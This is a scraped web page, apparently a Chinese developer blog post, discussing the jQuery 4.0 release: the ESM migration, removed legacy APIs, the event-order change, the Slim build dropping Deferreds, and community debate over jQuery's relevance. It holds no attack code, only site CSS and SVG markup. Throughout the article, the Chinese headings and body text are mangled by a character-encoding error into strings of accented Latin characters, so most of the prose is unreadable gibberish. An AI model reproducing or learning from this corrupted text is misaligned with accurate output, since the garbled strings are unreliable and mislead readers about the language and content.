class="article-title" data-v-61fb5e44="">
            jQuery 4.0 å‘å¸ƒï¼šæ˜¯å¦ä»å€¼å¾—ä½¿ç”¨ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1546375522426169/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ©™åºå‘˜å°ç«™
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:19:40.000Z" title="Tue Jan 20 2026 01:19:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">jQuery 4.0 çš„é‡å¤§å˜æ›´</h2>
<p>jQuery 4.0 çš„å‘å¸ƒå¯è°“æ˜¯ä¸€æ¬¡å¤§åˆ€é˜”æ–§çš„å˜é©ï¼Œè®¸å¤šå˜åŒ–ä¸ä»…åæ˜ äº† jQuery çš„æ¼”å˜ï¼Œä¹ŸæŠ˜å°„å‡ºç°ä»£ JavaScript çš„å‘å±•è¶‹åŠ¿ã€‚ä¸‹é¢æˆ‘ä»¬æ¥æ·±å…¥å‰–æä¸€ä¸‹è¿™äº›é‡å¤§å˜æ›´ã€‚</p>
<h3 data-id="heading-1">1. ä» AMD è¿ç§»åˆ° ESM</h3>
<p>é¦–å…ˆï¼ŒjQuery 4.0 æŠŠæ¨¡å—åŠ è½½çš„æ–¹å¼ä» AMDï¼ˆå¼‚æ­¥æ¨¡å—å®šä¹‰ï¼‰è¿ç§»åˆ°äº† ESMï¼ˆESæ¨¡å—ï¼‰ã€‚è¿™ä¸ä»…é¡ºåº”äº†ç°ä»£ JavaScript çš„å‘å±•æ–¹å‘ï¼Œè¿˜ä¸å¦‚ä»Šä¸»æµçš„æ¨¡å—åŒ–æ ‡å‡†æ¥è½¨ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œå¼€å‘è€…å¯ä»¥æ›´æ–¹ä¾¿åœ°ä½¿ç”¨åŸç”Ÿçš„æ¨¡å—ç³»ç»Ÿï¼Œå‡å°‘å¯¹å¤–éƒ¨åº“çš„ä¾èµ–ã€‚ä½ å¯èƒ½ä¼šé—®ï¼šâ€œè¿™å¯¹æˆ‘æœ‰ä»€ä¹ˆå½±å“ï¼Ÿâ€å…¶å®ï¼Œä½¿ç”¨ ESM å¯ä»¥è®©ä½ çš„ä»£ç æ›´åŠ ç®€æ´ï¼Œæ„å»ºå·¥å…·ä¹Ÿèƒ½æ›´é«˜æ•ˆåœ°å¤„ç†ä¾èµ–å…³ç³»ã€‚</p>
<h3 data-id="heading-2">2. ç§»é™¤è¿‡æ—¶ API</h3>
<p>æ¥ä¸‹æ¥ï¼ŒjQuery 4.0 ç§»é™¤äº†ä¸€äº›è¿‡æ—¶çš„ APIï¼Œä¾‹å¦‚ <code>jQuery.isArray</code>ã€‚è¿™ä¸€å˜åŒ–å¼ºè°ƒäº†åŸç”Ÿ JavaScript çš„å¼ºå¤§èƒ½åŠ›ï¼Œç‰¹åˆ«æ˜¯ <code>Array.isArray</code> çš„å¹¿æ³›æ”¯æŒã€‚æ­£å¦‚ Reddit ç”¨æˆ· u/bill_1992 æ‰€è¯´ï¼šâ€œåŸç”Ÿ JS çš„è¿›æ­¥è®©å¾ˆå¤š jQuery çš„ API å˜å¾—å¤šä½™ã€‚â€è¿™æ„å‘³ç€ï¼Œå¦‚æœä½ è¿˜åœ¨ä½¿ç”¨è¿™äº›è€æ—§çš„ APIï¼Œç°åœ¨æ˜¯æ—¶å€™è½¬å‘åŸç”Ÿæ–¹æ³•äº†ï¼Œæ¯•ç«Ÿï¼Œå®ƒä»¬æ›´å¿«ã€æ›´è½»é‡ã€‚</p>
<h3 data-id="heading-3">3. è°ƒæ•´äº‹ä»¶å¤„ç†é¡ºåº</h3>
<p>å¦å¤–ï¼ŒjQuery 4.0 è°ƒæ•´äº†äº‹ä»¶å¤„ç†çš„é¡ºåºï¼Œç»Ÿä¸€äº†å„å¤§æµè§ˆå™¨çš„è¡Œä¸ºã€‚ä»¥å¾€ï¼Œä¸åŒæµè§ˆå™¨åœ¨å¤„ç†ç„¦ç‚¹å’Œæ¨¡ç³Šäº‹ä»¶æ—¶æœ‰ä¸åŒçš„è¡¨ç°ï¼Œé€ æˆäº†è®¸å¤šå…¼å®¹æ€§é—®é¢˜ã€‚ç°åœ¨ï¼Œå¼€å‘è€…ä¸å†éœ€è¦ä¸ºè¿™ä¸ªé—®é¢˜çƒ¦æ¼ï¼Œç»Ÿä¸€çš„äº‹ä»¶å¤„ç†é¡ºåºå°†å¤§å¤§ç®€åŒ–è·¨æµè§ˆå™¨å¼€å‘çš„å¤æ‚æ€§ã€‚è¿™æ— ç–‘æ˜¯æé«˜å¼€å‘æ•ˆç‡çš„ä¸€å¤§åŠ©åŠ›ã€‚</p>
<h3 data-id="heading-4">4. â€˜Slimâ€™ æ„å»ºç‰ˆæœ¬å»æ‰ Deferreds</h3>
<p>å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒjQuery çš„â€˜Slimâ€™æ„å»ºç‰ˆæœ¬å»æ‰äº† Deferredsã€‚è¿™æ˜¯å› ä¸ºåŸç”Ÿ Promises çš„æ™®åŠä½¿å¾— Deferreds çš„ä½¿ç”¨å˜å¾—ä¸å†å¿…è¦ã€‚å¾ˆå¤šäººå¯èƒ½ä¼šé—®ï¼šâ€œå»æ‰è¿™éƒ¨åˆ†åŠŸèƒ½æ˜¯ä¸æ˜¯å½±å“ä½¿ç”¨ï¼Ÿâ€å…¶å®å¹¶ä¸ä¼šã€‚åŸç”Ÿ Promises çš„åŠŸèƒ½å·²ç»éå¸¸å¼ºå¤§ï¼Œä¸”ä½¿ç”¨èµ·æ¥æ›´åŠ ç®€æ´ã€‚å°±åƒ u/qubedView è¯„è®ºçš„é‚£æ ·ï¼šâ€œjQuery ä¾ç„¶æ´»ç€ï¼Œä½†å¤§å®¶éƒ½åœ¨ç”¨æ›´ç°ä»£çš„å·¥å…·ã€‚â€</p>
<h3 data-id="heading-5">5. jQuery çš„æ¼”å˜ä¸é€‚åº”æ€§</h3>
<p>è¿™äº›å˜åŒ–è¡¨æ˜ï¼ŒjQuery æ­£åœ¨ä¸æ–­æ¼”å˜å’Œé€‚åº”æ–°çš„å¼€å‘ç¯å¢ƒã€‚è™½ç„¶æœ‰äº›äººå¯èƒ½ä¼šè´¨ç–‘ jQuery æ˜¯å¦ä»å€¼å¾—ä½¿ç”¨ï¼Œå°¤å…¶æ˜¯åœ¨æ„å»ºæ–°çš„ web åº”ç”¨æ—¶ï¼Œä½† jQuery çš„å­˜åœ¨ä¾ç„¶æœ‰å…¶ä»·å€¼ã€‚æ­£å¦‚ä¸€ä½ç”¨æˆ·æ‰€è¯´ï¼šâ€œjQuery è§£å†³äº†æˆ‘ä»¬åœ¨ IE æ—¶ä»£çš„è®¸å¤šç—›ç‚¹ï¼Œç°åœ¨ä¾ç„¶æ˜¯ä¸ªå¥½å·¥å…·ï¼Œåªè¦æˆ‘ä»¬ç”¨å¾—å…¶æ‰€ã€‚â€</p>
<p>æ€»ä½“æ¥çœ‹ï¼ŒjQuery 4.0 çš„è¿™äº›å˜æ›´ä¸ä»…æ˜¯å¯¹è¿‡å»çš„åæ€ï¼Œæ›´æ˜¯å¯¹æœªæ¥çš„ä¸€ç§é€‚åº”ã€‚éšç€å‰ç«¯æŠ€æœ¯çš„ä¸æ–­å‘å±•ï¼Œå¼€å‘è€…ä»¬ä¹Ÿåœ¨ä¸æ–­å¯»æ±‚æ›´é«˜æ•ˆçš„å·¥å…·å’Œæ–¹æ³•ã€‚ä½ è§‰å¾— jQuery 4.0 çš„è¿™äº›å˜åŒ–ï¼Œå¯¹ä½ çš„å¼€å‘å·¥ä½œæœ‰ä»€ä¹ˆå¸®åŠ©ï¼Ÿæ¬¢è¿åœ¨è¯„è®ºåŒºåˆ†äº«ä½ çš„çœ‹æ³•ï¼</p>
<h2 data-id="heading-6">jQuery çš„å†å²ä¸å½±å“</h2>
<p>jQueryï¼Œä½œä¸ºä¸€ä¸ªå‰ç«¯å¼€å‘å·¥å…·ï¼Œç»å†äº†20å¹´çš„é£é£é›¨é›¨ï¼ŒçœŸçš„å¯ä»¥è¯´æ˜¯å‰ç«¯å¼€å‘ä¸­çš„ä¸€åœºé©å‘½ã€‚å®ƒçš„å‡ºç°ï¼Œå½»åº•æ”¹å˜äº†æˆ‘ä»¬ä¸æµè§ˆå™¨çš„äº’åŠ¨æ–¹å¼ï¼Œè®©å¤æ‚çš„ DOM æ“ä½œå˜å¾—ç®€å•æ˜“æ‡‚ã€‚å°¤å…¶æ˜¯åœ¨ IE çš„ç»Ÿæ²»æ—¶ä»£ï¼ŒjQuery å°±åƒä¸€æŠŠé’¥åŒ™ï¼Œæ‰“å¼€äº†å„ç§æŠ€æœ¯å¤§é—¨ï¼Œæå¤§åœ°é™ä½äº†å¼€å‘è€…çš„æŠ€æœ¯é—¨æ§›ã€‚</p>
<p>å›æƒ³èµ·æ—©æœŸçš„ç½‘é¡µå¼€å‘ï¼ŒIE å…¼å®¹æ€§é—®é¢˜ä¸¥é‡ï¼Œå¼€å‘è€…æ¯å¤©éƒ½åœ¨ä¸å„ç§æµè§ˆå™¨çš„â€œå¥‡è‘©è¡Œä¸ºâ€ä½œæ–—äº‰ã€‚æ­£æ˜¯åœ¨è¿™æ ·çš„èƒŒæ™¯ä¸‹ï¼ŒjQuery åº”è¿è€Œç”Ÿã€‚å®ƒæä¾›äº†ä¸€å¥—ç®€æ´çš„ APIï¼Œè®©å¼€å‘è€…å¯ä»¥ä¸å†ä¸ºæµè§ˆå™¨å·®å¼‚è€Œçƒ¦æ¼ï¼Œè½»æ¾å¤„ç†äº‹ä»¶ã€åŠ¨ç”»å’Œ AJAX è¯·æ±‚ã€‚æ­£å¦‚ Reddit ä¸€ä½ç”¨æˆ·æ‰€è¯´ï¼ŒjQuery è®©æˆ‘ä»¬åœ¨é‚£ä¸ªæ—¶ä»£çš„ç½‘é¡µå¼€å‘å˜å¾—â€œæ›´åŠ å¯å¿å—â€ã€‚</p>
<p>ç„¶è€Œï¼Œéšç€æŠ€æœ¯çš„å‘å±•ï¼ŒjQuery çš„ä½¿ç”¨åœºæ™¯é€æ¸å‡å°‘ã€‚ç°åœ¨ï¼Œè®¸å¤šç°ä»£æ¡†æ¶å’ŒåŸç”Ÿ JavaScript çš„åŠŸèƒ½å·²ç»å¯ä»¥è¦†ç›– jQuery çš„å¤§éƒ¨åˆ†ç”¨é€”ã€‚æ¯”å¦‚ï¼Œæœ‰å¼€å‘è€…åœ¨è®¨è®ºä¸­æåˆ°ï¼Œå¾ˆå¤š jQuery çš„ API å·²ç»è¢«æµè§ˆå™¨åŸç”Ÿçš„åŠŸèƒ½æ‰€æ›¿ä»£ï¼Œåƒ <code>Array.isArray</code> è¿™ç±»å‡½æ•°ï¼Œç°åœ¨æ ¹æœ¬ä¸éœ€è¦ jQuery å»å®ç°ã€‚å³ä½¿å¦‚æ­¤ï¼ŒjQuery ä¾ç„¶æœ‰å…¶å­˜åœ¨çš„ä»·å€¼ï¼Œç‰¹åˆ«æ˜¯åœ¨ä¸€äº›è€æ—§é¡¹ç›®æˆ–å¿«é€Ÿå¼€å‘çš„åœºæ™¯ä¸‹ï¼ŒjQuery ä»ç„¶æ˜¯ä¸ªå¥½å¸®æ‰‹ã€‚</p>
<p>å¾ˆå¤šå¼€å‘è€…ä»ç„¶ä¾èµ– jQuery æ¥å¿«é€Ÿè§£å†³ DOM æ“ä½œçš„é—®é¢˜ã€‚å°±åƒä¸€ä½ Reddit ç”¨æˆ·åˆ†äº«çš„ï¼Œâ€œæˆ‘ç”¨äº† jQuery å·²ç»å¾ˆå¤šå¹´äº†ï¼Œå› ä¸ºå®ƒç®€å•ã€æ–¹ä¾¿ï¼Œèƒ½å¤Ÿå¿«é€Ÿæå®šéœ€è¦çš„åŠŸèƒ½ã€‚â€è¿™å…¶å®åæ˜ å‡ºä¸€ç§ç°å®ï¼šåœ¨å¼€å‘çš„è¿‡ç¨‹ä¸­ï¼Œæ•ˆç‡å¾€å¾€æ˜¯ç¬¬ä¸€ä½çš„ï¼Œä½¿ç”¨ jQuery èƒ½å¤Ÿè®©ä½ è¿…é€Ÿä¸Šæ‰‹ï¼Œå®Œæˆä»»åŠ¡ã€‚</p>
<p>è™½è¯´ jQuery çš„ä¼ å¥‡åœ°ä½ä¸å®¹å°è§‘ï¼Œå®ƒä¹Ÿä¸ºåç»­çš„æ¡†æ¶å’Œåº“é“ºå¹³äº†é“è·¯ã€‚jQuery çš„æˆåŠŸï¼Œä¿ƒä½¿äº†ä¸€å¤§æ‰¹ç°ä»£å‰ç«¯æ¡†æ¶çš„è¯ç”Ÿï¼Œæ¯”å¦‚ React å’Œ Vueã€‚å®ƒä»¬åœ¨ç†å¿µä¸Šéƒ½å—åˆ°äº† jQuery çš„å½±å“ï¼Œå¼ºè°ƒç®€åŒ–å¼€å‘è€…çš„ä½¿ç”¨ä½“éªŒã€‚æ­£å¦‚æœ‰äººæŒ‡å‡ºçš„ï¼ŒjQuery æ˜¯ä¸€ç§æ›´ä¸ºé€šç”¨çš„è§£å†³æ–¹æ¡ˆï¼Œè€Œè®¸å¤šç°ä»£æ¡†æ¶åˆ™æ˜¯é’ˆå¯¹ç‰¹å®šé—®é¢˜è€Œè®¾è®¡çš„ã€‚</p>
<p>åœ¨è¿™ä¸ªæŠ€æœ¯ä¸æ–­è¿­ä»£çš„æ—¶ä»£ï¼ŒjQuery çš„å­˜åœ¨æ„ä¹‰å’Œä½¿ç”¨åœºæ™¯æ­£åœ¨ä¸æ–­å˜åŒ–ã€‚è™½è¯´æ–°çš„æ¡†æ¶å±‚å‡ºä¸ç©·ï¼Œæœ‰äººç”šè‡³è®¤ä¸ºåœ¨æ–°é¡¹ç›®ä¸­ä½¿ç”¨ jQuery æ˜¯ä¸ªâ€œé—è€é—å°‘â€çš„é€‰æ‹©ï¼Œä½†ä¸èƒ½å¦è®¤çš„æ˜¯ï¼ŒjQuery ä»ç„¶æ˜¯ä¸€ä¸ªå€¼å¾—å…³æ³¨çš„å·¥å…·ã€‚æ¯•ç«Ÿï¼Œå¾ˆå¤šå¼€å‘è€…è¿˜æ˜¯å–œæ¬¢ç”¨å®ƒæ¥å¿«é€Ÿä¸Šæ‰‹ï¼Œå®Œæˆé¡¹ç›®ï¼Œè€Œä¸å¿…æ·±å…¥ç ”ç©¶å¤æ‚çš„æ¡†æ¶ã€‚</p>
<p>æ€»çš„æ¥è¯´ï¼ŒjQuery åœ¨è¿‡å»20å¹´é‡Œç•™ä¸‹äº†æ·±åˆ»çš„å°è®°ï¼Œå¸®åŠ©æ— æ•°å¼€å‘è€…æ¸¡è¿‡äº†è‰°éš¾çš„å¼€å‘æ—¶å…‰ã€‚è™½ç„¶å®ƒçš„ä½¿ç”¨é€æ¸å‡å°‘ï¼Œä½†åœ¨åˆé€‚çš„åœºæ™¯ä¸‹ï¼ŒjQuery ä¾ç„¶èƒ½å‘æŒ¥å…¶ç‹¬ç‰¹çš„ä»·å€¼ã€‚å¯¹äºæˆ‘ä»¬è¿™äº›å¼€å‘è€…è€Œè¨€ï¼Œé‡è¦çš„æ˜¯åœ¨åˆé€‚çš„æ—¶æœºï¼Œé€‰æ‹©åˆé€‚çš„å·¥å…·æ¥è§£å†³é—®é¢˜ï¼Œè€Œ jQueryï¼Œä»ç„¶å¯èƒ½æ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚</p>
<h2 data-id="heading-7">äº‰è®®ä¸è§‚ç‚¹åˆ†æ</h2>
<p>éšç€ jQuery 4.0 çš„å‘å¸ƒï¼Œå¼€å‘è€…ä»¬å¯¹å®ƒçš„æœªæ¥å±•å¼€äº†çƒ­çƒˆè®¨è®ºã€‚æœ‰äººè®¤ä¸ºï¼Œåœ¨æ–°é¡¹ç›®ä¸­ä½¿ç”¨ jQuery çš„åˆé€‚æ€§å€¼å¾—è¿›ä¸€æ­¥æ¢è®¨ã€‚å…¶å®ï¼Œè¿™ä¸ªé—®é¢˜å¹¶ä¸ç®€å•ã€‚éšç€å‰ç«¯æŠ€æœ¯çš„å‘å±•ï¼Œæ–°çš„æ¡†æ¶å±‚å‡ºä¸ç©·ï¼ŒjQuery çš„ä½ç½®ä¹Ÿåœ¨ä¸æ–­è¢«é‡æ–°å®¡è§†ã€‚</p>
<p>é¦–å…ˆï¼Œè®¸å¤šå¼€å‘è€…è®¤ä¸º jQuery çš„ç®€å•æ€§æ˜¯å®ƒæŒç»­å—æ¬¢è¿çš„é‡è¦åŸå› ã€‚æ¯”å¦‚ï¼Œè¯„è®ºè€… u/LieNaive4921 è¡¨ç¤ºï¼Œè™½ç„¶å¯ä»¥ç”¨åŸç”Ÿ JavaScript æ›¿ä»£ï¼Œä½† jQuery çš„æ˜“ç”¨æ€§å’Œç®€æ´çš„è¯­æ³•è®©ä»–æ›´æ„¿æ„ç»§ç»­ä½¿ç”¨ã€‚æ¯•ç«Ÿï¼Œå¼€å‘è€…ä»¬å¹¶ä¸æ€»æ˜¯è¿½æ±‚æœ€æ–°çš„æŠ€æœ¯ï¼Œå¾ˆå¤šæ—¶å€™â€œèƒ½ç”¨å°±æ˜¯å¥½â€ã€‚è¿™åœ¨å¿«é€Ÿè¿­ä»£çš„å¼€å‘è¿‡ç¨‹ä¸­å°¤å…¶æ˜æ˜¾ï¼Œæ—¶é—´å°±æ˜¯é‡‘é’±ï¼Œè€Œ jQuery æä¾›äº†ä¸€ç§â€œå¿«æå®šâ€çš„æ–¹æ¡ˆã€‚</p>
<p>ç„¶è€Œï¼Œç°ä»£æ¡†æ¶å¦‚ Reactã€Vue å’Œ Angular çš„å´›èµ·ï¼Œç¡®å®å¯¹ jQuery çš„åœ°ä½æ„æˆäº†ä¸€å®šå¨èƒã€‚è¯„è®ºè€… u/cheezballs ç›´è¨€ä¸è®³åœ°é—®ï¼Œä¸ºä»€ä¹ˆåœ¨æ–°çš„ç»¿è‰²åº”ç”¨ä¸­è¿˜è¦ä½¿ç”¨ jQueryï¼Ÿåœ¨ä»–ä»¬çœ‹æ¥ï¼ŒjQuery ä¼¼ä¹å·²ç»ä¸å†é€‚åº”å½“å‰å¤æ‚çš„å¼€å‘ç¯å¢ƒã€‚å°¤å…¶æ˜¯å‰ç«¯å¼€å‘é€æ¸è½¬å‘ç»„ä»¶åŒ–å’Œå•é¡µåº”ç”¨ï¼ˆSPAï¼‰æ¨¡å¼ï¼Œè¿™äº›æ¡†æ¶åœ¨å¤„ç†æ•°æ®ç»‘å®šå’ŒçŠ¶æ€ç®¡ç†æ–¹é¢çš„ä¼˜åŠ¿æ˜æ˜¾ã€‚</p>
<p>å¼€å‘è€…ç¤¾åŒºå¯¹ jQuery çš„çœ‹æ³•ä¹Ÿå‘ˆç°å‡ºæ˜æ˜¾çš„åˆ†æ­§ã€‚ä¸€æ–¹é¢ï¼Œæœ‰äººæ€€å¿µ jQuery åœ¨äº’è”ç½‘æ—©æœŸä¸ºå¼€å‘è€…æ‰€åšçš„è´¡çŒ®ï¼Œè®¤ä¸ºå®ƒæ˜¯â€œè®©ç½‘é¡µå¼€å‘å˜å¾—æ›´å®¹æ˜“â€çš„å·¥å…·ã€‚å¦ä¸€æ–¹é¢ï¼Œè¶Šæ¥è¶Šå¤šçš„å¼€å‘è€…åˆ™è®¤ä¸ºï¼ŒjQuery çš„å­˜åœ¨æ˜¯å¯¹ç°ä»£å¼€å‘æ¡†æ¶çš„ä¸€ç§å¹²æ‰°ã€‚åœ¨ Reddit è®¨è®ºä¸­ï¼Œu/bugtank çš„è¯„è®ºâ€œNature is healingâ€æ°å¥½åæ˜ äº†è¿™ç§è§‚ç‚¹â€”â€”éšç€æŠ€æœ¯çš„å‘å±•ï¼Œè‡ªç„¶ä¼šæœ‰æ–°æ—§äº¤æ›¿ã€‚</p>
<p>å…¶å®ï¼Œä¸€äº›è€å¼€å‘è€…ä¾ç„¶é’Ÿæƒ…äº jQueryï¼Œä¸»è¦æ˜¯å› ä¸ºä»–ä»¬åœ¨è¿™ä¸ªå·¥å…·ä¸­æ‰¾åˆ°äº†ç†Ÿæ‚‰æ„Ÿã€‚u/LessonStudio æåˆ°ï¼ŒjQuery æ˜¯ä¸€ä¸ªéå¸¸é€šç”¨çš„å·¥å…·ï¼Œèƒ½å¤Ÿè§£å†³è®¸å¤šç‰¹å®šçš„é—®é¢˜ã€‚å¯¹äºä»–ä»¬æ¥è¯´ï¼Œä½¿ç”¨ jQuery å°±åƒæ˜¯ç©¿ä¸Šä¸€åŒèˆ’é€‚çš„è€é‹ï¼Œä¸éœ€è¦é€‚åº”æ–°æŠ€æœ¯å¸¦æ¥çš„å­¦ä¹ æ›²çº¿ã€‚è¿™ç§æƒ…å†µåœ¨è®¸å¤šè€é¡¹ç›®ä¸­å°¤ä¸ºæ˜æ˜¾ï¼Œå¾ˆå¤šå¼€å‘è€…å®æ„¿ç»´æŠ¤å·²æœ‰çš„ä»£ç ï¼Œè€Œä¸æ˜¯å†’é™©é‡æ„ã€‚</p>
<p>æ€»çš„æ¥è¯´ï¼ŒjQuery æ— ç–‘åœ¨å‰ç«¯å¼€å‘å²ä¸Šç•™ä¸‹äº†æµ“å¢¨é‡å½©çš„ä¸€ç¬”ï¼Œä½†é¢å¯¹ç°ä»£æŠ€æœ¯çš„è¿…çŒ›å‘å±•ï¼Œå®ƒæ˜¯å¦ä»ç„¶å€¼å¾—ä½¿ç”¨ï¼Ÿè¿™ä¸ªé—®é¢˜å¹¶æ²¡æœ‰æ ‡å‡†ç­”æ¡ˆï¼Œå…³é”®åœ¨äºä½ çš„éœ€æ±‚å’Œé¡¹ç›®çš„æ€§è´¨ã€‚ä½œä¸ºå¼€å‘è€…ï¼Œæˆ‘ä»¬éœ€è¦æ ¹æ®å…·ä½“æƒ…å†µåšå‡ºé€‰æ‹©ã€‚ä½ æ€ä¹ˆçœ‹ï¼Ÿåœ¨ä½ çš„é¡¹ç›®ä¸­ï¼ŒjQuery è¿˜ä¼šæ˜¯ä¸€ä¸ªé€‰é¡¹å—ï¼Ÿ</p>
<h2 data-id="heading-8">æœªæ¥å±•æœ›ä¸æŠ€æœ¯è¶‹åŠ¿</h2>
<p>jQuery 4.0 çš„å‘å¸ƒï¼Œæ ‡å¿—ç€ä¸€ä¸ªæ—¶ä»£çš„å»¶ç»­ä¸è½¬å˜ã€‚è¿™ä¸ä»…ä»…æ˜¯ä¸€ä¸ªç‰ˆæœ¬çš„æ›´æ–°ï¼Œæ›´æ˜¯å¯¹æˆ‘ä»¬å‰ç«¯å¼€å‘è€…çš„ä¸€ç§æé†’ï¼šæŠ€æœ¯åœ¨ä¸æ–­è¿›æ­¥ã€‚æ­£å¦‚ä¸€ä½è¯„è®ºè€…æ‰€è¯´ï¼Œè¿™æ¬¡æ›´æ–°çš„å¾ˆå¤šå†…å®¹éƒ½æ˜¯åœ¨â€œå»é™¤â€è¿‡æ—¶çš„APIï¼Œåæ˜ å‡ºåŸç”ŸJavaScriptçš„å¼ºå¤§ã€‚å…¶å®ï¼Œè¿™ä¹Ÿåœ¨é¢„ç¤ºç€å¼€å‘è€…ä»¬å¯èƒ½éœ€è¦é‡æ–°å®¡è§†jQueryåœ¨ç°ä»£å¼€å‘ä¸­çš„åœ°ä½ã€‚</p>
<h3 data-id="heading-9">jQueryä¸åŸç”ŸJSçš„ç»“åˆ</h3>
<p>éšç€åŸç”ŸJavaScriptçš„æ—¥ç›Šæˆç†Ÿï¼Œå¾ˆå¤šjQueryæ›¾ç»è§£å†³çš„é—®é¢˜ï¼Œå¦‚<code>Array.isArray</code>ã€<code>Promise</code>ç­‰ï¼Œå·²ç»æœ‰äº†æ›´ä¸ºæ ‡å‡†åŒ–çš„åŸç”Ÿè§£å†³æ–¹æ¡ˆã€‚å¼€å‘è€…ä»¬å¼€å§‹æ€è€ƒï¼šåœ¨æ–°é¡¹ç›®ä¸­ï¼Œæ˜¯å¦è¿˜éœ€è¦ä¾èµ–jQueryï¼Ÿå¾ˆå¤šäººè®¤ä¸ºï¼Œä½¿ç”¨åŸç”ŸJSå¯ä»¥å‡å°‘é¢å¤–çš„ä¾èµ–ï¼Œæé«˜æ€§èƒ½ã€‚æ¯•ç«Ÿï¼Œç°ä»£æµè§ˆå™¨çš„å…¼å®¹æ€§å·²ç»å¥½åˆ°è®©jQueryçš„å­˜åœ¨å˜å¾—å¯æœ‰å¯æ— ã€‚</p>
